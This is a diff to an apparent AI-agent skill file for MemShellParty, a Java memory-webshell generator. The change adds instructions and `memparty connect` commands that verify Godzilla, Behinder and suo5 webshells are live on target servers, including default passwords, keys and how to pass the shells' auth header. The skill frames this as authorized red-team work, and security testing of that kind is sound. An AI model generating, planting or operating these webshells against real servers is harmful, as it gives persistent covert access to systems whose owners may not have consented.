@@ -1,6 +1,6 @@
 ---
 name: memshell-party
-description: Generate Java memory shells and probe shells with MemShellParty (the `memparty` CLI or its MCP tools). Use when the user wants to build a Java web memory-shell payload (Godzilla / Behinder / AntSword / Command / Suo5 / NeoreGeorg / Proxy / Custom) or a probe to fingerprint a target middleware — for authorized security testing, red-team engagements, or research only.
+description: Generate Java memory shells and probe shells with MemShellParty (the `memparty` CLI or its MCP tools), and verify deployed shells with `memparty connect`. Use when the user wants to build a Java web memory-shell payload (Godzilla / Behinder / AntSword / Command / Suo5 / NeoreGeorg / Proxy / Custom), probe a target middleware, or test that a Godzilla / Behinder / suo5 shell is alive — for authorized security testing, red-team engagements, or research only.
 ---
 
 # MemShellParty skill
@@ -138,6 +138,26 @@ Output:
 - payload → **stdout** by default.
 - `-o shell.class` / `-o shell.jar` → auto base64-decodes and writes binary.
 - `--json` → full response (class names, sizes, base64 bytes, config echo) for downstream tooling.
+
+## Step 4 — Verify the shell is alive
+
+Once a shell is injected/uploaded, `memparty connect` does the real protocol handshake and tells
+you whether it works (exit 0/1):
+
+```bash
+memparty connect -u <shell-url> -t godzilla --pass <pass> --key <key>   # defaults pass/key
+memparty connect -u <shell-url> -t behinder --pass <pass>               # default rebeyond
+memparty connect -u <shell-url> -t suo5                                 # add --suo5-mode v2|v1 to force
+```
+
+MemShellParty shells check an auth header — take `headerName`/`headerValue` from the
+`gen --json` output (`shellToolConfig`) and pass them along, or every check fails with an empty
+response (the Suo5v2 shell checks it too):
+
+```bash
+memparty connect -u <shell-url> -t godzilla --pass pass --key key \
+  --header-name User-Agent --header-value <headerValue-from-gen-json>
+```
 
 ## Gotchas
 
